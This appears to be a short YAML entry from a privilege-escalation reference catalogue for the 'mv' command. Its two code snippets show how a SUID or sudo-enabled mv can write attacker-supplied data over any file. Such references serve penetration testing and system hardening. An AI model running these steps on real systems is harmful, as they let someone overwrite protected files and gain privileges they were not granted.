---
description: This can be used to move and then read or write files from a restricted file systems or with elevated privileges.
functions:
  suid:
    - code: |
        LFILE=file_to_write
        TF=$(mktemp)
        echo "DATA" > $TF
        ./mv $TF $LFILE
  sudo:
    - code: |
        LFILE=file_to_write
        TF=$(mktemp)
        echo "DATA" > $TF
        sudo mv $TF $LFILE
---
